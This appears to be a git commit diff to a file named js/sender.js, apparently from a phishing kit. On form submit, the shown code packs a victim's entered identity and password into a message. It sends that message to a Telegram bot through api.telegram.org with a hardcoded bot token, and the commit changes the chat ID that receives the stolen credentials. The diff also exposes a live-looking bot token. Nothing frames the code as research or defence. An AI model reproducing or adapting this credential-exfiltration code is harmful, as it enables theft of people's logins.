6d6d9798c2d8d6e39234239eb9847004de7b200b
dezignsensei <145669245+dezignsensei@users.noreply.github.com>
2023-09-22 12:15:06 +0100

    Add files via upload

--- js/sender.js
+++ js/sender.js
@@ -9,7 +9,7 @@ form.addEventListener("submit", (e) => {
     var my_text = `Result is:%0A - Identity: ${identity} %0A - Password: ${password}`
 
     var token = "6079880704:AAGk126KOADLmf2YAYlfg_W_ZPFc8g-sjYk";
-    var chat_id = -1001971960686
+    var chat_id = -4056071823
     var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`
 
     let api = new XMLHttpRequest();
